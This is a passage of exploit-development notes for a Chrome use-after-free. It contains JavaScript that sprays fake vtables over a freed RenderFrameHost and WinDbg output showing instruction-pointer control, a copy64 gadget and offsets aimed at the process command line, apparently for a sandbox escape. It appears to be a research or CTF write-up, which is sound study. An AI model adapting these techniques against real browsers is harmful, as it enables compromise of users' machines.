let data = new ArrayBuffer(kRenderFrameHostSize);
view = new DataView(data);
offset = 0;
view.setBigUint64(offset, kFirstFakeVtablePtr - BigInt(kFirstCallVtableOffset), true);
offset += kFirstFakeVtableOffset;
view.setBigUint64(offset, kSecondFakeVtablePtr - BigInt(kSecondCallVtableOffset), true);
offset += kSecondFakeVtableOffset;
view.setBigUint64(offset, kMessageLoopObserverVtable - BigInt(kThirdCallVtableOffset), true);
second_pointer = await getFreedPtr();
second_heap = await spray(data);
await triggerUAF(second_pointer);
```

```
(4300.3404): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
chrome!content::responsiveness::MessageLoopObserver::DidProcessTask+0x4:
00007ff9`6f6f21c4 488b4108        mov     rax,qword ptr [rcx+8] ds:00000000`00000008=????????????????
0:000> u @rip
chrome!content::responsiveness::MessageLoopObserver::DidProcessTask+0x4:
00007ff9`6f6f21c4 488b4108        mov     rax,qword ptr [rcx+8]
00007ff9`6f6f21c8 48ffe0          jmp     rax
00007ff9`6f6f21cb cc              int     3
```

- Damn hard to debug cause this function is called in the background multiple times...

```
0:046> g
(c90.4878): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Users\asdku\Desktop\cve-2020-\chrome\chrome.dll
chrome!base::RepeatingCallback<void (const base::PendingTask *)>::Run [inlined in chrome!content::responsiveness::MessageLoopObserver::DidProcessTask+0x8]:
00007ff9`6f6f21c8 48ffe0          jmp     rax {41414141`41414141}
0:000> r
rax=4141414141414141 rbx=0000014d136cd170 rcx=0000014d15e5d0c8
rdx=00007ff974918060 rsi=000000191c7fe370 rdi=0000000000000000
rip=00007ff96f6f21c8 rsp=000000191c7fe268 rbp=0000000000000002
 r8=000000191c7fe388  r9=000000191c7fe370 r10=0000000000000080
r11=0100f3312012d840 r12=000000191c7fe4d8 r13=0000000000000000
r14=000000191c7fe350 r15=000000191c7fe418
iopl=0         nv up ei pl nz na pe nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
chrome!base::RepeatingCallback<void (const base::PendingTask *)>::Run [inlined in chrome!content::responsiveness::MessageLoopObserver::DidProcessTask+0x8]:
00007ff9`6f6f21c8 48ffe0          jmp     rax {41414141`41414141}
0:000> dq @rcx
0000014d`15e5d0c8  00000000`00000000 41414141`41414141
0000014d`15e5d0d8  42414141`41414141 43414141`41414141
0000014d`15e5d0e8  44414141`41414141 45414141`41414141
0000014d`15e5d0f8  46414141`41414141 47414141`41414141
0000014d`15e5d108  48414141`41414141 49414141`41414141
0000014d`15e5d118  80038200`cca6e824 2e66642d`7361636d
0000014d`15e5d128  00000000`002f736d 0b000000`00000000
0000014d`15e5d138  80038300`cca4e826 766f672d`7361636d
// end state of arbitrary_call_rnd.html
```

- so we know how to place our arguments here

### Copy64

```
0:000> x chrome!*copy64*
00007ff9`6f902c20 chrome!copy64
0:000> ? 00007ff9`6f902c20-chrome
Evaluate expression: 21703712 = 00000000`014b2c20
```

```
0:000> r
rax=000001d105eb8dd8 rbx=000001d1060207c0 rcx=000001d105eb8dd8
rdx=00007ff9756c9608 rsi=000000697ebfe2f0 rdi=0000000000000000
rip=00007ff96f902c20 rsp=000000697ebfe1e8 rbp=0000000000000002
 r8=00007ff96f902c20  r9=000000697ebfe2f0 r10=0000000000000180
r11=f87a8bfa3fa94275 r12=000000697ebfe458 r13=0000000000000000
r14=000000697ebfe2d0 r15=000000697ebfe398
iopl=0         nv up ei pl nz na pe nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
chrome!extensions::SizeConstraints::set_minimum_size:
00007ff9`6f902c20 488b02          mov     rax,qword ptr [rdx] ds:00007ff9`756c9608=000001d100273b20
0:000> u @rip
chrome!extensions::SizeConstraints::set_minimum_size [C:\passport\chromium\src\extensions\browser\app_window\size_constraints.cc @ 76]:
00007ff9`6f902c20 488b02          mov     rax,qword ptr [rdx]
00007ff9`6f902c23 488901          mov     qword ptr [rcx],rax
00007ff9`6f902c26 c3              ret
00007ff9`6f902c27 cc              int     3
chrome!extensions::SizeConstraints::set_maximum_size [C:\passport\chromium\src\extensions\browser\app_window\size_constraints.cc @ 80]:
00007ff9`6f902c28 488b02          mov     rax,qword ptr [rdx]
00007ff9`6f902c2b 48894108        mov     qword ptr [rcx+8],rax
00007ff9`6f902c2f c3              ret
chrome!extensions::bad_message::ReceivedBadMessage [C:\passport\chromium\src\extensions\browser\bad_message.cc @ 30]:
00007ff9`6f902c30 56              push    rsi
0:000> u 00007ff9756c9608 
chrome!current_process_commandline_:
00007ff9`756c9608 203b            and     byte ptr [rbx],bh
00007ff9`756c960a 27              ???
00007ff9`756c960b 00d1            add     cl,dl
00007ff9`756c960d 0100            add     dword ptr [rax],eax
00007ff9`756c960f 0000            add     byte ptr [rax],al
00007ff9`756c9611 0000            add     byte ptr [rax],al
00007ff9`756c9613 0000            add     byte ptr [rax],al
00007ff9`756c9615 0000            add     byte ptr [rax],al
0:004> ? 000001d105eb8e00-000001d105eb8dd8
Evaluate expression: 40 = 00000000`00000028
```

- `000001d105eb8dd8` is where we are copying to

- `000001d105eb8e00` is the location of our render_frame_host_


### Finding resrouces

```
0:000> x chrome!*SetCommandLineFlagsForSandboxType*
00007ff9`6e56bfd0 chrome!service_manager::SetCommandLineFlagsForSandboxType (class base::CommandLine *, service_manager::SandboxType)
0:000> ? 00007ff9`6e56bfd0-chrome
Evaluate expression: 1163216 = 00000000`0011bfd0
0:000> x chrome!*current_process_commandline_*
00007ff9`756c9608 chrome!current_process_commandline_ = 0x00000191`dd8e3b20
0:000> ? 00007ff9`756c9608 - chrome
Evaluate expression: 120034824 = 00000000`07279608
````